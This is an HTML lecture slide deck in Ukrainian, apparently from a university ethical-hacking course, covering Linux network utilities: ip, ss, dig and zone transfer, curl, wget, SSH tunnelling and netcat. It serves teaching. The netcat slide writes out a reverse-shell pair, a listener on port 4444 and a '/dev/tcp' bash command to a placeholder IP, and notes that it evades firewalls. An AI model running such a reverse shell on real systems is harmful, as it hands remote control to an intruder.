@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 2.7 — Мережеві утиліти та налаштування</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="2">
+
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Мережеві утиліти та налаштування</h1>
+      <div class="subtitle">Тема 2.7 — Linux та командний рядок для хакера</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Network Info & DNS -->
+    <section class="slide">
+      <h2>Мережева інформація та DNS</h2>
+
+      <div class="two-column">
+        <div class="card-blue">
+          <h4>Інтерфейси та з'єднання</h4>
+          <ul>
+            <li><code>ip addr show</code> — всі інтерфейси</li>
+            <li><code>ip route show</code> — таблиця маршрутизації</li>
+            <li><code>ss -tuln</code> — відкриті порти</li>
+            <li><code>ss -tunap</code> — з процесами (root)</li>
+            <li><code>ping -c 4 target</code> — перевірка з'єднання</li>
+            <li><code>traceroute target</code> — маршрут до цілі</li>
+          </ul>
+        </div>
+        <div class="card-green">
+          <h4>DNS-запити</h4>
+          <ul>
+            <li><code>dig example.com A</code> — A-запис</li>
+            <li><code>dig example.com MX</code> — поштові сервери</li>
+            <li><code>dig @8.8.8.8 target.com</code> — через конкретний DNS</li>
+            <li><code>dig target.com axfr</code> — трансфер зони (якщо дозволено!)</li>
+            <li><code>nslookup example.com</code></li>
+            <li><code>host example.com</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="warning-box">
+        <h4>Увага</h4>
+        <p><code>dig axfr</code> — спроба трансферу DNS-зони може розкрити всю внутрішню структуру домену</p>
+      </div>
+    </section>
+
+    <!-- Slide 3: curl, wget, SSH -->
+    <section class="slide">
+      <h2>curl, wget та SSH</h2>
+
+      <div class="three-col-grid">
+        <div class="card-purple">
+          <h4>curl — HTTP-запити</h4>
+          <ul>
+            <li><code>curl https://api.example.com</code> — GET</li>
+            <li><code>curl -X POST -d "user=admin" url</code> — POST</li>
+            <li><code>curl -H "Authorization: Bearer TOKEN" url</code></li>
+            <li><code>curl -k https://self-signed.com</code> — ігнорувати SSL</li>
+            <li><code>curl -I url</code> — тільки заголовки</li>
+          </ul>
+        </div>
+        <div class="card-blue">
+          <h4>wget — завантаження</h4>
+          <ul>
+            <li><code>wget url/file.zip</code> — файл</li>
+            <li><code>wget -r -np -k url</code> — дзеркало сайту</li>
+            <li><code>wget -c url</code> — продовжити завантаження</li>
+          </ul>
+        </div>
+        <div class="card-green">
+          <h4>SSH — безпечне з'єднання</h4>
+          <ul>
+            <li><code>ssh user@target</code> — підключення</li>
+            <li><code>ssh -p 2222 user@target</code> — інший порт</li>
+            <li><code>ssh -L 8080:localhost:80 user@target</code> — тунель</li>
+            <li><code>ssh -D 9050 user@target</code> — SOCKS проксі</li>
+            <li><code>ssh-keygen -t rsa -b 4096</code> — генерація ключа</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: Netcat -->
+    <section class="slide">
+      <h2>Netcat — "швейцарський ніж" мережі</h2>
+
+      <div class="gradient-box gradient-red">
+        <h4>Netcat (nc) — універсальний мережевий інструмент</h4>
+        <p>Читання та запис даних через мережеві з'єднання (TCP/UDP). Один з найважливіших інструментів пентестера.</p>
+      </div>
+
+      <div class="flow-row">
+        <div class="flow-step">Атакуючий<br><code>nc -lvnp 4444</code></div>
+        <div class="flow-arrow"></div>
+        <div class="flow-step">Ціль<br><code>bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1</code></div>
+      </div>
+
+      <div class="two-column">
+        <div class="card-yellow">
+          <h4>Базові операції</h4>
+          <ul>
+            <li><code>nc -lvnp 4444</code> — слухач</li>
+            <li><code>nc target 4444</code> — з'єднання</li>
+            <li><code>nc -zv target 20-80</code> — сканування портів</li>
+          </ul>
+        </div>
+        <div class="card-red">
+          <h4>Передача файлів</h4>
+          <ul>
+            <li>Приймач: <code>nc -lvnp 4444 &gt; file.txt</code></li>
+            <li>Відправник: <code>nc target 4444 &lt; file.txt</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="info-box">
+        <h4>Reverse Shell</h4>
+        <p>Підключення від цілі до атакуючого. Обходить файрволи, бо <span class="highlight">вихідні з'єднання зазвичай дозволені</span>.</p>
+      </div>
+    </section>
+
+    <!-- Slide 5: Summary -->
+    <section class="slide">
+      <h2>Підсумок</h2>
+
+      <div class="success-box">
+        <h4>Головна ідея</h4>
+        <p>Мережеві утиліти Linux — фундамент для <span class="highlight">розвідки</span>, <span class="highlight">експлуатації</span> та <span class="highlight">пост-експлуатації</span>.</p>
+      </div>
+
+      <ul class="checklist">
+        <li><code>ip</code> / <code>ss</code> — інформація про мережу та з'єднання</li>
+        <li><code>dig</code> — DNS-розвідка та трансфер зон</li>
+        <li><code>curl</code> — взаємодія з веб-сервісами та API</li>
+        <li>SSH — безпечне з'єднання та тунелювання</li>
+        <li>Netcat — Reverse Shell, передача файлів, сканування</li>
+        <li><code>/etc/hosts</code> та <code>/etc/resolv.conf</code> — мережева конфігурація</li>
+      </ul>
+
+      <div class="info-box">
+        <h4>Далі</h4>
+        <p>Це завершує лекцію 2. Далі — лекція 3: <strong>Розвідка (Reconnaissance) та OSINT</strong>.</p>
+      </div>
+    </section>
+
+  </div>
+
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+
+  <script src="../../js/slides.js"></script>
+
+</body>
+</html>
